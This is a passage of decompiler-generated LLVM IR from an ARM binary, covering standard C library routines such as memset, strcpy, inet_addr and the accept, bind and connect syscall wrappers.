  %v1_11680 = add i32 %v1_11690, 4
  %v2_11680 = inttoptr i32 %v1_11680 to i32*
  %v3_11680 = load i32, i32* %v2_11680, align 4
  store i32 %v3_11680, i32* %r2.global-to-local, align 4
  %v1_11684 = add i32 %v1_11690, 12
  %v2_11684 = inttoptr i32 %v1_11684 to i32*
  %v3_11684 = load i32, i32* %v2_11684, align 4
  store i32 %v3_11684, i32* %r1.global-to-local, align 4
  %v2_11688 = add i32 %v3_11684, %v3_11680
  store i32 %v2_11688, i32* @r4, align 4
  %v1_1168c = add i32 %v2_11688, 4
  %v2_1168c = inttoptr i32 %v1_1168c to i32*
  %v3_1168c = load i32, i32* %v2_1168c, align 4
  %v2_11690 = add i32 %v1_11690, 16
  %v3_11690 = inttoptr i32 %v2_11690 to i32*
  store i32 %v3_1168c, i32* %v3_11690, align 4
  %v0_11694 = load i32, i32* @r4, align 4
  %v1_11694 = add i32 %v0_11694, 8
  %v2_11694 = inttoptr i32 %v1_11694 to i16*
  %v3_11694 = load i16, i16* %v2_11694, align 2
  %v4_11694 = zext i16 %v3_11694 to i32
  %v0_11698 = load i32, i32* %r2.global-to-local, align 4
  %v1_11698 = load i32, i32* %r1.global-to-local, align 4
  %v2_11698 = add i32 %v1_11698, %v0_11698
  %v3_11698 = inttoptr i32 %v2_11698 to i32*
  %v4_11698 = load i32, i32* %v3_11698, align 4
  store i32 %v4_11698, i32* %r1.global-to-local, align 4
  %v2_1169c = add i32 %v0_11698, %v4_11694
  %v2_116a0 = icmp eq i32 %v4_11698, 0
  %v1_116a4 = load i32, i32* @r5, align 4
  %v2_116a4 = add i32 %v1_116a4, 4
  %v3_116a4 = inttoptr i32 %v2_116a4 to i32*
  store i32 %v2_1169c, i32* %v3_116a4, align 4
  br i1 %v2_116a0, label %dec_label_pc_11650, label %dec_label_pc_116ac

dec_label_pc_116ac:                               ; preds = %dec_label_pc_11680, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_116b8 = load i32, i32* @r6, align 4
  %v2_116b8 = add i32 %v0_116b8, 44
  %v3_116b8 = inttoptr i32 %v2_116b8 to i32*
  %v4_116b8 = load i32, i32* %v3_116b8, align 4
  call void @__pseudo_branch(i32 %v4_116b8)
  %v0_116c4 = load i32, i32* @r4, align 4
  store i32 %v3_11600, i32* @r4, align 4
  store i32 %v6_11600, i32* @r5, align 4
  store i32 %v9_11600, i32* @r6, align 4
  store i32 %v12_11600, i32* @r7, align 4
  store i32 %v15_11600, i32* @lr, align 4
  ret i32 %v0_116c4

; uselistorder directives
  uselistorder i32 %v1_11690, { 0, 2, 1 }
  uselistorder i32 %v6_11650, { 1, 0 }
  uselistorder i32 %v0_11650, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_11680, { 1, 0 }
}

define i32 @function_116d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_116d8:
  %v0_116d8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_116d8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_116d8
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_116d8, %bb
  %v4_116e4 = phi i32 [ %arg1, %dec_label_pc_116d8 ], [ 0, %bb ]
  ret i32 %v4_116e4

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_116e8 = load i32, i32* @lr, align 4
  %v0_116f0 = call i32 @__aeabi_read_tp()
  %v3_116f4 = load i16, i16* @global_var_21d68.334, align 2
  %v4_116f4 = sext i16 %v3_116f4 to i32
  %v2_116f8 = add i32 %v4_116f4, %v0_116f0
  store i32 %v0_116e8, i32* @lr, align 4
  ret i32 %v2_116f8
}

define i32 @clock(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_1170c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1170c, i32* @r0, align 4
  %v1_11714 = call i32 @times(i32 %v2_1170c)
  %v2_11718 = load i32, i32* %stack_var_-24, align 4
  %v2_1171c = add i32 %v2_11718, %tmp
  %v2_11724 = mul i32 %v2_1171c, 10000
  %v1_11728 = and i32 %v2_11724, 2147483632
  ret i32 %v1_11728

; uselistorder directives
  uselistorder i32 %v2_1170c, { 1, 0 }
}

define i32 @"$d.10"(i32 %arg1) local_unnamed_addr {
dec_label_pc_11738:
  %v0_11738 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11738, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_11738
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_11738, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_11740 = call i32 @_memcpy()
  ret i32 %v0_11740
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_11750 = call i32 @_memcpy()
  ret i32 %v0_11750

; uselistorder directives
  uselistorder i32 ()* @_memcpy, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_11764 = icmp eq i32 %arg3, 8
  store i1 %v8_11764, i1* %cpsr_z.global-to-local, align 1
  %v5_11768 = icmp slt i32 %arg3, 8
  br i1 %v5_11768, label %dec_label_pc_117c8, label %dec_label_pc_1176c

dec_label_pc_1176c:                               ; preds = %entry
  %v4_1176c = mul i32 %arg2, 256
  %v5_1176c = or i32 %v4_1176c, %arg2
  %v4_11770 = mul i32 %v5_1176c, 65536
  %v5_11770 = or i32 %v4_11770, %v5_1176c
  store i32 %v5_11770, i32* @r1, align 4
  %v1_1177457 = urem i32 %tmp, 4
  %v2_1177458 = icmp eq i32 %v1_1177457, 0
  store i1 %v2_1177458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_1177458, label %dec_label_pc_11784, label %bb

bb:                                               ; preds = %dec_label_pc_1176c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1176c ]
  %v3_1177859 = phi i32 [ %v6_11778, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1176c ]
  %v4_11778 = inttoptr i32 %v3_1177859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_11778, align 1
  %v5_11778 = load i32, i32* @r3, align 4
  %v6_11778 = add i32 %v5_11778, 1
  store i32 %v6_11778, i32* @r3, align 4
  %v0_1177c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_11788.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_1177c.pr, label %dec_label_pc_11784, label %.thread

.thread:                                          ; preds = %bb
  %v2_1177c = add i32 %v0_11788.pr.pre, -1
  store i32 %v2_1177c, i32* %r2.global-to-local, align 4
  %v1_11774 = urem i32 %v6_11778, 4
  %v2_11774 = icmp eq i32 %v1_11774, 0
  store i1 %v2_11774, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11774, label %dec_label_pc_11784, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_11778.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_11778.pre to i8
  br label %bb

dec_label_pc_11784:                               ; preds = %.thread, %bb, %dec_label_pc_1176c
  %v0_1179028 = phi i32 [ %tmp, %dec_label_pc_1176c ], [ %v6_11778, %bb ], [ %v6_11778, %.thread ]
  %v0_11788.pr = phi i32 [ %arg3, %dec_label_pc_1176c ], [ %v0_11788.pr.pre, %bb ], [ %v2_1177c, %.thread ]
  %v0_11784 = load i32, i32* @r1, align 4
  store i32 %v0_11784, i32* %ip.global-to-local, align 4
  %v8_1178810 = icmp eq i32 %v0_11788.pr, 8
  store i1 %v8_1178810, i1* %cpsr_z.global-to-local, align 1
  %v5_1178c11 = icmp slt i32 %v0_11788.pr, 8
  br i1 %v5_1178c11, label %dec_label_pc_117c8, label %dec_label_pc_11790.preheader

dec_label_pc_11790.preheader:                     ; preds = %dec_label_pc_11784
  %v1_1179046 = inttoptr i32 %v0_1179028 to i32*
  store i32 %v0_11784, i32* %v1_1179046, align 4
  %v3_1179047 = add i32 %v0_1179028, 4
  %v4_1179048 = inttoptr i32 %v3_1179047 to i32*
  %v5_1179049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_1179049, i32* %v4_1179048, align 4
  %v6_1179050 = add i32 %v0_1179028, 8
  store i32 %v6_1179050, i32* @r3, align 4
  %v0_1179451 = load i32, i32* %r2.global-to-local, align 4
  %v1_1179452 = add i32 %v0_1179451, -8
  store i32 %v1_1179452, i32* %r2.global-to-local, align 4
  %v5_1179c53 = icmp slt i32 %v1_1179452, 8
  br i1 %v5_1179c53, label %dec_label_pc_11790.dec_label_pc_117c8.loopexit_crit_edge, label %dec_label_pc_117a0

dec_label_pc_117a0:                               ; preds = %dec_label_pc_11790.preheader, %dec_label_pc_11788.dec_label_pc_11790_crit_edge
  %v6_1179055 = phi i32 [ %v6_11790, %dec_label_pc_11788.dec_label_pc_11790_crit_edge ], [ %v6_1179050, %dec_label_pc_11790.preheader ]
  %v0_1179054 = phi i32 [ %v12_117bc, %dec_label_pc_11788.dec_label_pc_11790_crit_edge ], [ %v0_1179028, %dec_label_pc_11790.preheader ]
  %v1_117a0 = inttoptr i32 %v6_1179055 to i32*
  %v2_117a0 = load i32, i32* @r1, align 4
  store i32 %v2_117a0, i32* %v1_117a0, align 4
  %v3_117a0 = add i32 %v0_1179054, 12
  %v4_117a0 = inttoptr i32 %v3_117a0 to i32*
  %v5_117a0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_117a0, i32* %v4_117a0, align 4
  %v6_117a0 = add i32 %v0_1179054, 16
  store i32 %v6_117a0, i32* @r3, align 4
  %v0_117a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_117a4 = add i32 %v0_117a4, -8
  store i32 %v1_117a4, i32* %r2.global-to-local, align 4
  %v5_117ac = icmp slt i32 %v1_117a4, 8
  br i1 %v5_117ac, label %dec_label_pc_117a0.dec_label_pc_117c8.loopexit_crit_edge, label %dec_label_pc_117b0

dec_label_pc_117b0:                               ; preds = %dec_label_pc_117a0
  %v1_117b0 = inttoptr i32 %v6_117a0 to i32*
  %v2_117b0 = load i32, i32* @r1, align 4
  store i32 %v2_117b0, i32* %v1_117b0, align 4
  %v3_117b0 = add i32 %v0_1179054, 20
  %v4_117b0 = inttoptr i32 %v3_117b0 to i32*
  %v5_117b0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_117b0, i32* %v4_117b0, align 4
  %v6_117b0 = add i32 %v0_1179054, 24
  store i32 %v6_117b0, i32* @r3, align 4
  %v0_117b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_117b4 = add i32 %v0_117b4, -8
  store i32 %v1_117b4, i32* %r2.global-to-local, align 4
  %v5_117bc = icmp slt i32 %v1_117b4, 8
  br i1 %v5_117bc, label %dec_label_pc_117b0.dec_label_pc_117c8.loopexit_crit_edge, label %dec_label_pc_11788

dec_label_pc_11788:                               ; preds = %dec_label_pc_117b0
  %v7_117bc = inttoptr i32 %v6_117b0 to i32*
  %v8_117bc = load i32, i32* @r1, align 4
  store i32 %v8_117bc, i32* %v7_117bc, align 4
  %v9_117bc = add i32 %v0_1179054, 28
  %v10_117bc = inttoptr i32 %v9_117bc to i32*
  %v11_117bc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_117bc, i32* %v10_117bc, align 4
  %v12_117bc = add i32 %v0_1179054, 32
  store i32 %v12_117bc, i32* @r3, align 4
  %v6_117c0 = load i32, i32* %r2.global-to-local, align 4
  %v7_117c0 = add i32 %v6_117c0, -8
  store i32 %v7_117c0, i32* %r2.global-to-local, align 4
  %v5_1178c = icmp slt i32 %v7_117c0, 8
  br i1 %v5_1178c, label %dec_label_pc_11788.dec_label_pc_117c8.loopexit_crit_edge, label %dec_label_pc_11788.dec_label_pc_11790_crit_edge

dec_label_pc_11788.dec_label_pc_11790_crit_edge:  ; preds = %dec_label_pc_11788
  %v2_11790.pre = load i32, i32* @r1, align 4
  %v1_11790 = inttoptr i32 %v12_117bc to i32*
  store i32 %v2_11790.pre, i32* %v1_11790, align 4
  %v3_11790 = add i32 %v0_1179054, 36
  %v4_11790 = inttoptr i32 %v3_11790 to i32*
  %v5_11790 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11790, i32* %v4_11790, align 4
  %v6_11790 = add i32 %v0_1179054, 40
  store i32 %v6_11790, i32* @r3, align 4
  %v0_11794 = load i32, i32* %r2.global-to-local, align 4
  %v1_11794 = add i32 %v0_11794, -8
  store i32 %v1_11794, i32* %r2.global-to-local, align 4
  %v5_1179c = icmp slt i32 %v1_11794, 8
  br i1 %v5_1179c, label %dec_label_pc_11790.dec_label_pc_117c8.loopexit_crit_edge, label %dec_label_pc_117a0

dec_label_pc_11788.dec_label_pc_117c8.loopexit_crit_edge: ; preds = %dec_label_pc_11788
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_117c8

dec_label_pc_11790.dec_label_pc_117c8.loopexit_crit_edge: ; preds = %dec_label_pc_11788.dec_label_pc_11790_crit_edge, %dec_label_pc_11790.preheader
  %v1_11794.lcssa = phi i32 [ %v1_1179452, %dec_label_pc_11790.preheader ], [ %v1_11794, %dec_label_pc_11788.dec_label_pc_11790_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_117c8

dec_label_pc_117a0.dec_label_pc_117c8.loopexit_crit_edge: ; preds = %dec_label_pc_117a0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_117c8

dec_label_pc_117b0.dec_label_pc_117c8.loopexit_crit_edge: ; preds = %dec_label_pc_117b0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_117c8

dec_label_pc_117c8:                               ; preds = %dec_label_pc_11784, %dec_label_pc_11788.dec_label_pc_117c8.loopexit_crit_edge, %dec_label_pc_11790.dec_label_pc_117c8.loopexit_crit_edge, %dec_label_pc_117a0.dec_label_pc_117c8.loopexit_crit_edge, %dec_label_pc_117b0.dec_label_pc_117c8.loopexit_crit_edge, %entry
  %v0_117d0 = phi i32 [ %arg3, %entry ], [ %v1_117b4, %dec_label_pc_117b0.dec_label_pc_117c8.loopexit_crit_edge ], [ %v1_117a4, %dec_label_pc_117a0.dec_label_pc_117c8.loopexit_crit_edge ], [ %v1_11794.lcssa, %dec_label_pc_11790.dec_label_pc_117c8.loopexit_crit_edge ], [ %v7_117c0, %dec_label_pc_11788.dec_label_pc_117c8.loopexit_crit_edge ], [ %v0_11788.pr, %dec_label_pc_11784 ]
  %v2_117c8 = icmp eq i32 %v0_117d0, 0
  store i1 %v2_117c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_117c8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_117c8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_117c8
  %v1_117d0 = sub i32 7, %v0_117d0
  store i32 %v1_117d0, i32* %r2.global-to-local, align 4
  %v3_117d4 = mul i32 %v1_117d0, 4
  %v4_117d4 = add i32 %v3_117d4, ptrtoint (i32* @global_var_117dc.376 to i32)
  call void @__pseudo_branch(i32 %v4_117d4)
  %v0_117dc = load i32, i32* @r1, align 4
  %v1_117dc = trunc i32 %v0_117dc to i8
  %v2_117dc = load i32, i32* @r3, align 4
  %v3_117dc = inttoptr i32 %v2_117dc to i8*
  store i8 %v1_117dc, i8* %v3_117dc, align 1
  %v4_117dc = load i32, i32* @r3, align 4
  %v5_117dc = add i32 %v4_117dc, 1
  store i32 %v5_117dc, i32* %r3.global-to-local, align 4
  %v0_117e0 = load i32, i32* @r1, align 4
  %v1_117e0 = trunc i32 %v0_117e0 to i8
  %v3_117e0 = inttoptr i32 %v5_117dc to i8*
  store i8 %v1_117e0, i8* %v3_117e0, align 1
  %v4_117e0 = load i32, i32* %r3.global-to-local, align 4
  %v5_117e0 = add i32 %v4_117e0, 1
  store i32 %v5_117e0, i32* %r3.global-to-local, align 4
  %v0_117e4 = load i32, i32* @r1, align 4
  %v1_117e4 = trunc i32 %v0_117e4 to i8
  %v3_117e4 = inttoptr i32 %v5_117e0 to i8*
  store i8 %v1_117e4, i8* %v3_117e4, align 1
  %v4_117e4 = load i32, i32* %r3.global-to-local, align 4
  %v5_117e4 = add i32 %v4_117e4, 1
  store i32 %v5_117e4, i32* %r3.global-to-local, align 4
  %v0_117e8 = load i32, i32* @r1, align 4
  %v1_117e8 = trunc i32 %v0_117e8 to i8
  %v3_117e8 = inttoptr i32 %v5_117e4 to i8*
  store i8 %v1_117e8, i8* %v3_117e8, align 1
  %v4_117e8 = load i32, i32* %r3.global-to-local, align 4
  %v5_117e8 = add i32 %v4_117e8, 1
  store i32 %v5_117e8, i32* %r3.global-to-local, align 4
  %v0_117ec = load i32, i32* @r1, align 4
  %v1_117ec = trunc i32 %v0_117ec to i8
  %v3_117ec = inttoptr i32 %v5_117e8 to i8*
  store i8 %v1_117ec, i8* %v3_117ec, align 1
  %v4_117ec = load i32, i32* %r3.global-to-local, align 4
  %v5_117ec = add i32 %v4_117ec, 1
  store i32 %v5_117ec, i32* %r3.global-to-local, align 4
  %v0_117f0 = load i32, i32* @r1, align 4
  %v1_117f0 = trunc i32 %v0_117f0 to i8
  %v3_117f0 = inttoptr i32 %v5_117ec to i8*
  store i8 %v1_117f0, i8* %v3_117f0, align 1
  %v4_117f0 = load i32, i32* %r3.global-to-local, align 4
  %v5_117f0 = add i32 %v4_117f0, 1
  store i32 %v5_117f0, i32* %r3.global-to-local, align 4
  %v0_117f4 = load i32, i32* @r1, align 4
  %v1_117f4 = trunc i32 %v0_117f4 to i8
  %v3_117f4 = inttoptr i32 %v5_117f0 to i8*
  store i8 %v1_117f4, i8* %v3_117f4, align 1
  %v4_117f4 = load i32, i32* %r3.global-to-local, align 4
  %v5_117f4 = add i32 %v4_117f4, 1
  store i32 %v5_117f4, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_11790, { 1, 0 }
  uselistorder i32 %v12_117bc, { 1, 2, 0 }
  uselistorder i32 %v0_1179054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_11788.pr, { 0, 2, 1 }
  uselistorder i32 %v6_11778, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1176c, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 11, 13, 12, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 0, 3, 4, 9, 8, 5, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_117c8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_117a0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_118101 = load i32, i32* @r1, align 4
  %v1_118102 = inttoptr i32 %v0_118101 to i8*
  %v2_118103 = load i8, i8* %v1_118102, align 1
  %v2_118145 = icmp eq i8 %v2_118103, 0
  store i1 %v2_118145, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_118103, i8* %arg1, align 1
  br i1 %v2_118145, label %dec_label_pc_11820, label %dec_label_pc_11808

dec_label_pc_11808:                               ; preds = %entry, %dec_label_pc_11808
  %v0_11808 = load i32, i32* @r1, align 4
  %v1_11808 = add i32 %v0_11808, 1
  store i32 %v1_11808, i32* @r1, align 4
  %v0_1180c = load i32, i32* %r2.global-to-local, align 4
  %v1_1180c = add i32 %v0_1180c, 1
  store i32 %v1_1180c, i32* %r2.global-to-local, align 4
  %v1_11810 = inttoptr i32 %v1_11808 to i8*
  %v2_11810 = load i8, i8* %v1_11810, align 1
  %v2_11814 = icmp eq i8 %v2_11810, 0
  store i1 %v2_11814, i1* %cpsr_z.global-to-local, align 1
  %v3_11818 = inttoptr i32 %v1_1180c to i8*
  store i8 %v2_11810, i8* %v3_11818, align 1
  %v0_1181c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1181c, label %dec_label_pc_11820, label %dec_label_pc_11808

dec_label_pc_11820:                               ; preds = %dec_label_pc_11808, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11808, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_1182c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_1182c, i32* @r1, align 4
  %v0_11830 = call i32 @inet_aton()
  %v2_11834 = icmp eq i32 %v0_11830, 0
  %v4_11838 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_11834, i32 -1, i32 %v4_11838
  ret i32 %storemerge
}

define i32 @__sys_accept() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1184c = load i32, i32* @r7, align 4
  store i32 %v3_1184c, i32* %stack_var_-8, align 4
  %v0_11858 = load i32, i32* @r0, align 4
  store i32 %v0_11858, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11858, -4095
  br i1 %tmp, label %dec_label_pc_11880, label %dec_label_pc_11868

dec_label_pc_11868:                               ; preds = %entry
  %v0_1186c = call i32 @__aeabi_read_tp()
  %v3_11870 = load i16, i16* @global_var_21d68.334, align 2
  %v4_11870 = sext i16 %v3_11870 to i32
  %v0_11874 = load i32, i32* %r2.global-to-local, align 4
  %v1_11874 = sub i32 0, %v0_11874
  store i32 %v1_11874, i32* %r2.global-to-local, align 4
  %v3_11878 = add i32 %v4_11870, %v0_1186c
  %v4_11878 = inttoptr i32 %v3_11878 to i32*
  store i32 %v1_11874, i32* %v4_11878, align 4
  %v2_11880.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11880

dec_label_pc_11880:                               ; preds = %entry, %dec_label_pc_11868
  %v1_11884 = phi i32 [ %v0_11858, %entry ], [ -1, %dec_label_pc_11868 ]
  %v2_11880 = phi i32 [ %v3_1184c, %entry ], [ %v2_11880.pre, %dec_label_pc_11868 ]
  store i32 %v2_11880, i32* @r7, align 4
  ret i32 %v1_11884

; uselistorder directives
  uselistorder i32 %v0_11858, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11880, { 1, 0 }
}

define i32 @"$d.9"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_11888:
  %v0_11888 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11888, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11888
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_11888 = load i32, i32* @sp, align 4
  %v8_11888 = shl i32 %v2_11888, %tmp
  %v9_11888 = and i32 %v8_11888, %arg1
  store i32 %v9_11888, i32* %arg2, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11888, %bb
  %v8_1188c = phi i32 [ %arg1, %dec_label_pc_11888 ], [ %v9_11888, %bb ]
  ret i32 %v8_1188c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_11894 = load i32, i32* @r4, align 4
  store i32 %v3_11894, i32* %stack_var_-20, align 4
  %v6_11894 = load i32, i32* @r5, align 4
  %v9_11894 = load i32, i32* @r6, align 4
  %v12_11894 = load i32, i32* @r7, align 4
  %v4_118a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 12784) to i32*), align 4
  %v2_118a4 = icmp eq i32 %v4_118a0, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_118a4, label %dec_label_pc_118bc, label %entry.dec_label_pc_118c8_crit_edge

entry.dec_label_pc_118c8_crit_edge:               ; preds = %entry
  br label %dec_label_pc_118c8

dec_label_pc_118bc:                               ; preds = %entry
  store i32 %v3_11894, i32* @r4, align 4
  store i32 %v9_11894, i32* @r6, align 4
  store i32 %v12_11894, i32* @r7, align 4
  %v0_118c4 = call i32 @__sys_accept()
  br label %dec_label_pc_118c8

dec_label_pc_118c8:                               ; preds = %entry.dec_label_pc_118c8_crit_edge, %dec_label_pc_118bc
  %v0_118c8 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_118c8, i32* @r5, align 4
  %v0_118d8 = load i32, i32* @r4, align 4
  store i32 %v0_118d8, i32* @r0, align 4
  %v0_118dc = call i32 @__sys_accept()
  store i32 %v0_118dc, i32* @r4, align 4
  %v0_118e4 = load i32, i32* @r5, align 4
  %v1_118e8 = call i32 @__libc_disable_asynccancel(i32 %v0_118e4)
  %v0_118ec = load i32, i32* @r4, align 4
  %v2_118f4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_118f4, i32* @r4, align 4
  store i32 %v6_11894, i32* @r5, align 4
  store i32 %v9_11894, i32* @r6, align 4
  store i32 %v12_11894, i32* @r7, align 4
  ret i32 %v0_118ec

; uselistorder directives
  uselistorder label %dec_label_pc_118c8, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11904 = load i32, i32* @r7, align 4
  store i32 %v3_11904, i32* %stack_var_-8, align 4
  %v0_11910 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11910, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11910, -4095
  br i1 %tmp, label %dec_label_pc_11938, label %dec_label_pc_11920

dec_label_pc_11920:                               ; preds = %entry
  %v0_11924 = call i32 @__aeabi_read_tp()
  %v3_11928 = load i16, i16* @global_var_21d68.334, align 2
  %v4_11928 = sext i16 %v3_11928 to i32
  %v0_1192c = load i32, i32* %r2.global-to-local, align 4
  %v1_1192c = sub i32 0, %v0_1192c
  store i32 %v1_1192c, i32* %r2.global-to-local, align 4
  %v3_11930 = add i32 %v4_11928, %v0_11924
  %v4_11930 = inttoptr i32 %v3_11930 to i32*
  store i32 %v1_1192c, i32* %v4_11930, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11938.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11938

dec_label_pc_11938:                               ; preds = %entry, %dec_label_pc_11920
  %v1_1193c = phi i32 [ %v0_11910, %entry ], [ -1, %dec_label_pc_11920 ]
  %v2_11938 = phi i32 [ %v3_11904, %entry ], [ %v2_11938.pre, %dec_label_pc_11920 ]
  store i32 %v2_11938, i32* @r7, align 4
  ret i32 %v1_1193c

; uselistorder directives
  uselistorder i32 %v0_11910, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11938, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11940:
  %v0_11940 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11940, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11940
  %v2_11944 = load i32, i32* @r8, align 4
  %v3_11944 = load i32, i32* @r4, align 4
  %v8_11944 = lshr i32 %v2_11944, %v3_11944
  %v9_11944 = and i32 %v8_11944, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11940, %bb
  %v10_11944 = phi i32 [ %arg1, %dec_label_pc_11940 ], [ %v9_11944, %bb ]
  ret i32 %v10_11944

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11948 = load i32, i32* @r7, align 4
  store i32 %v3_11948, i32* %stack_var_-8, align 4
  %v0_11954 = load i32, i32* @r0, align 4
  store i32 %v0_11954, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11954, -4095
  br i1 %tmp, label %dec_label_pc_1197c, label %dec_label_pc_11964

dec_label_pc_11964:                               ; preds = %entry
  %v0_11968 = call i32 @__aeabi_read_tp()
  %v3_1196c = load i16, i16* @global_var_21d68.334, align 2
  %v4_1196c = sext i16 %v3_1196c to i32
  store i32 %v4_1196c, i32* @r3, align 4
